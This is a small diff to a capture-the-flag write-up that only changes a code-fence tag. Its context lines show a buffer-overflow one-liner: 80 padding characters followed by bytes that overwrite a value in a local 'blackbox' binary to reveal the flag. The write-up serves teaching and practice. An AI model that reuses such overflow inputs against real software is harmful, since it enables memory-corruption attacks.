@@ -20,7 +20,7 @@ Now it was time to go wild. So, I gave very big inputs to see the threshold of S
 So, lets just print to exceed 80 characters because at 81st character we find the string overflow here.
 Executing this one liner, gives us flag.
 
-```python
+```py
 python -c "print '11111111111111111111111111111111111111111111111111111111111111111111111111111111\x02\x00\x00\x00'" | ./blackbox
 ```
 Output:
